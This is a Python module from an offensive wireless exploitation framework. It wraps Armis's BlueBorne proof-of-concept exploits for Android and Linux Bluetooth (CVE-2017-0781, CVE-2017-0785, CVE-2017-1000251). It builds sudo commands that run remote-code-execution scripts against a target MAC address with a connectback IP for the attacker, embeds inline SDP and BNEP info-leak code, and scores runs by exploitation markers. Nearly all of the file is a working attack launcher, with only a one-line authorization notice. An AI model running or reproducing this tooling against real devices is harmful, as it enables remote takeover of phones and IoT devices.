#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para BlueBorne (ArmisSecurity/blueborne) — PoCs Bluetooth Android/Linux.

Dispara os PoCs do repositório upstream (CVE-2017-0781 BNEP RCE, CVE-2017-0785 SDP
info leak, variante BNEP, CVE-2017-1000251 Linux L2CAP). Requer ambiente tipo Linux,
adaptador BT compatível (ex.: CSR para troca de BDADDR no fluxo Android) e
dependências do próprio repositório (pybluez, pwn, scapy onde aplicável).

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

_ENV_HCI = "BLUEBORNE_HCI"
_ENV_ATTACKER_IP = "BLUEBORNE_ATTACKER_IP"
_ENV_REPO = "BLUEBORNE_PATH"

# PoC SDP (CVE-2017-0785): lógica em ``bluedroid.py``; o upstream não expõe CLI dedicado.
_INLINE_SDP_INFO_LEAK = """
import sys
import bluetooth

sys.path.insert(0, ".")
from bluedroid import do_sdp_info_leak

dst = sys.argv[1]
addr = bluetooth.read_local_bdaddr()
src = addr[0] if isinstance(addr, (list, tuple)) else addr
result = do_sdp_info_leak(dst, src)
sys.stdout.write("SDP_INFO_LEAK_OK records=%d\\n" % len(result))
"""

# Variante BNEP (CVE-2017-0781): conexão L2CAP BNEP + tentativa de recv (sem RCE completo).
_INLINE_BNEP_INFO_LEAK = """
import sys
import bluetooth

BNEP_PSM = 15
dst = sys.argv[1]
addr = bluetooth.read_local_bdaddr()
src = addr[0] if isinstance(addr, (list, tuple)) else addr
bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bnep.bind((src, 0))
bnep.connect((dst, BNEP_PSM))
bnep.settimeout(3.0)
try:
    data = bnep.recv(8192)
    sys.stdout.write("BNEP_INFO_LEAK_BYTES=%d\\n" % len(data))
except Exception:
    sys.stdout.write("BNEP_INFO_LEAK_NO_RECV\\n")
bnep.close()
sys.stdout.write("BNEP_INFO_LEAK_DONE\\n")
"""


class Exploit(Exploit):
    """Subprocess bridge para PoCs BlueBorne (Bluetooth Classic)."""

    __info__ = {
        "name": "BlueBorne Bridge",
        "description": (
            "Execução de PoCs Armis BlueBorne (subprocess): CVE-2017-0781 (BNEP RCE), "
            "CVE-2017-0785 (SDP info leak), variante BNEP info leak, CVE-2017-1000251 "
            "(Linux L2CAP / bluez) — clone em IoT/blueborne ou BLUEBORNE_PATH."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Armis Security / BlueBorne upstream (invoked as subprocess)",
        ),
        "references": (
            "https://github.com/ArmisSecurity/blueborne",
            "https://www.armis.com/blueborne/",
        ),
        "devices": ("bluetooth", "bluetooth_classic", "android", "linux_bluez"),
    }

    target_address = OptMAC("", "Endereço BT alvo (ex.: AA:BB:CC:DD:EE:FF)")
    attack = OptString(
        "auto",
        "Ataque: auto | android_rce | android_info_leak_sdp | "
        "android_info_leak_bnep | linux_rce",
    )
    dry_run = OptBool(False, "Somente exibir o comando, sem executar")

    # Arquivos de referência no clone upstream (scripts ou módulos onde a lógica vive).
    _ATTACK_SCRIPTS: Dict[str, str] = {
        "android_rce": "android/doit.py",
        "android_info_leak_sdp": "android/bluedroid.py",
        "android_info_leak_bnep": "android/doit.py",
        "linux_rce": "linux-bluez/amazon_echo/exploit.py",
    }

    def _repo_root(self) -> Path:
        """Resolve a raiz do clone BlueBorne.

        Returns:
            Caminho absoluto do repositório.

        Note:
            Ordem: variável de ambiente ``BLUEBORNE_PATH``; senão ``<IoT>/blueborne``
            (irmão de WirelessXPL-Forge sob ``submodules/IoT``).
        """
        env = os.environ.get(_ENV_REPO, "").strip()
        if env:
            return Path(env).expanduser().resolve()
        return Path(__file__).resolve().parents[5] / "blueborne"

    def _resolve_marker_path(self, attack_key: str) -> Optional[Path]:
        """Retorna caminho de um arquivo esperado para validar o clone."""
        rel = self._ATTACK_SCRIPTS.get(attack_key)
        if not rel:
            return None
        root = self._repo_root()
        candidate = root / rel
        if candidate.is_file():
            return candidate
        return None

    def _python2_preferred(self) -> str:
        """Executável Python 2 preferido pelo upstream BlueBorne Android."""
        for name in ("python2", "python2.7"):
            found = shutil.which(name)
            if found:
                return found
        logger.warning(
            "python2 não encontrado no PATH; usando %s (pode falhar em PoCs py2).",
            sys.executable,
        )
        return sys.executable

    def _hci(self) -> str:
        """Interface HCI local (ex.: hci0)."""
        return os.environ.get(_ENV_HCI, "hci0").strip() or "hci0"

    def _attacker_ip(self) -> str:
        """IP de connectback exigido por ``doit.py`` e exploits Linux."""
        return os.environ.get(_ENV_ATTACKER_IP, "").strip()

    def _build_command(
        self, attack_key: str
    ) -> Tuple[List[str], Optional[Path], dict, bool, Optional[str]]:
        """Monta linha de comando, cwd, env, flag de captura e padrão de sucesso.

        Args:
            attack_key: Chave normalizada do ataque.

        Returns:
            Tupla ``(cmd, cwd, env_extra, capture_output, success_substring)``.

        Raises:
            FileNotFoundError: Repositório ou artefato ausente.
            ValueError: Parâmetros ou ambiente inválidos.
        """
        addr = str(self.target_address).strip()
        if not addr:
            raise ValueError("Defina target_address (MAC Bluetooth do alvo).")

        root = self._repo_root()
        if not root.is_dir():
            raise FileNotFoundError(
                "Clone blueborne ausente. Defina {} ou coloque o repo em {}.".format(
                    _ENV_REPO,
                    Path(__file__).resolve().parents[5] / "blueborne",
                )
            )

        marker = self._resolve_marker_path(attack_key)
        if not marker:
            raise FileNotFoundError(
                "Arquivo PoC não encontrado para attack='{}' (esperado sob {}).".format(
                    attack_key,
                    root,
                )
            )

        env_extra = {"PYTHONPATH": str(root)}
        py2 = self._python2_preferred()
        hci = self._hci()
        ip = self._attacker_ip()

        if attack_key == "android_rce":
            if not ip:
                raise ValueError(
                    "android_rce requer IP de connectback: defina a variável de ambiente "
                    "{}.".format(_ENV_ATTACKER_IP)
                )
            script = root / "android" / "doit.py"
            cmd = ["sudo", py2, str(script), hci, addr, ip]
            return cmd, script.parent, env_extra, False, None

        if attack_key == "android_info_leak_sdp":
            cmd = ["sudo", py2, "-c", _INLINE_SDP_INFO_LEAK.strip(), addr]
            return cmd, root / "android", env_extra, True, "SDP_INFO_LEAK_OK"

        if attack_key == "android_info_leak_bnep":
            cmd = ["sudo", py2, "-c", _INLINE_BNEP_INFO_LEAK.strip(), addr]
            return cmd, root / "android", env_extra, True, "BNEP_INFO_LEAK_DONE"

        if attack_key == "linux_rce":
            if not ip:
                raise ValueError(
                    "linux_rce requer connectback: defina {}.".format(_ENV_ATTACKER_IP)
                )
            exdir = root / "linux-bluez" / "amazon_echo"
            script = exdir / "exploit.py"
            if not script.is_file():
                raise FileNotFoundError("Linux exploit ausente: {}".format(script))
            py_linux = shutil.which("python3") or shutil.which("python") or sys.executable
            cmd = ["sudo", py_linux, str(script), hci, addr, ip]
            return cmd, exdir, env_extra, False, None

        raise ValueError("Ataque desconhecido: {}".format(attack_key))

    @staticmethod
    def _evaluate_output(attack_key: str, stdout: str, stderr: str, returncode: int) -> bool:
        """Interpreta saída em busca de indicadores de sucesso do PoC."""
        text = (stdout or "") + "\n" + (stderr or "")

        if attack_key == "android_info_leak_sdp":
            return "SDP_INFO_LEAK_OK" in text

        if attack_key == "android_info_leak_bnep":
            if "BNEP_INFO_LEAK_DONE" in text:
                return True
            return bool(re.search(r"BNEP_INFO_LEAK_BYTES=\d+", text))

        if attack_key in ("android_rce", "linux_rce"):
            if returncode == 0 and (
                re.search(r"\bDone\b", text)
                or "libc_base:" in text
                or "Pwning" in text
                or "wait_for_connection" in text.lower()
            ):
                return True
            return returncode == 0

        return returncode == 0

    def run(self) -> None:
        """Executa o PoC BlueBorne selecionado."""
        key = str(self.attack).strip().lower().replace("-", "_")

        if key == "auto":
            if self.dry_run:
                print_info("Ataques mapeados (clone ArmisSecurity/blueborne):")
                for k, rel in sorted(self._ATTACK_SCRIPTS.items()):
                    print_status("  {} → {}".format(k, rel))
                print_info(
                    "Variáveis opcionais: {} (default hci0), {} (RCE / Linux).".format(
                        _ENV_HCI,
                        _ENV_ATTACKER_IP,
                    )
                )
                print_info("Raiz do repo: {} ou {}.".format(_ENV_REPO, self._repo_root()))
            else:
                print_error(
                    "attack=auto: use dry_run para listar PoCs ou defina um attack explícito."
                )
            return

        try:
            cmd, cwd, env_extra, capture, needle = self._build_command(key)
        except (FileNotFoundError, ValueError) as err:
            print_error(str(err))
            logger.debug("blueborne build_command failed: %s", err)
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — comando BlueBorne:")
            print_status(cmd_str)
            if cwd:
                print_info("cwd: {}".format(cwd))
            return

        label = self._ATTACK_SCRIPTS.get(key, "blueborne")
        print_status("BlueBorne PoC: {} → {}".format(key, label))
        logger.info("Comando BlueBorne: %s", cmd_str)
        if cwd:
            logger.info("cwd: %s", cwd)
        print_info("Use apenas em equipamento autorizado (pesquisa / lab).")

        run_env = os.environ.copy()
        run_env.update(env_extra)

        try:
            if capture:
                completed = subprocess.run(
                    cmd,
                    check=False,
                    cwd=str(cwd) if cwd else None,
                    env=run_env,
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
                out, err = completed.stdout or "", completed.stderr or ""
                if out:
                    logger.info("[stdout]\n%s", out.rstrip())
                if err:
                    logger.info("[stderr]\n%s", err.rstrip())
                ok = self._evaluate_output(key, out, err, completed.returncode)
                if needle and needle in out:
                    logger.info("Indicador esperado encontrado: %s", needle)
                if ok:
                    print_success(
                        "PoC finalizou com indicadores favoráveis (exit=%s)."
                        % completed.returncode
                    )
                else:
                    print_error(
                        "PoC encerrado sem indicadores claros de sucesso (exit=%s)."
                        % completed.returncode
                    )
            else:
                completed = subprocess.run(
                    cmd,
                    check=False,
                    cwd=str(cwd) if cwd else None,
                    env=run_env,
                )
                if completed.returncode == 0:
                    print_success("Processo BlueBorne encerrou com código 0.")
                else:
                    print_error(
                        "Processo BlueBorne encerrou com código {}.".format(
                            completed.returncode
                        )
                    )
                logger.info("blueborne subprocess exit=%s", completed.returncode)
        except subprocess.TimeoutExpired:
            print_error("Timeout aguardando o PoC BlueBorne.")
            logger.error("blueborne subprocess timeout")
        except KeyboardInterrupt:
            print_info("\nBlueBorne interrompido pelo usuário.")
            logger.info("blueborne interrupted by user")
        except Exception as err:
            print_error("Falha ao executar BlueBorne: {}".format(err))
            logger.exception("blueborne subprocess")
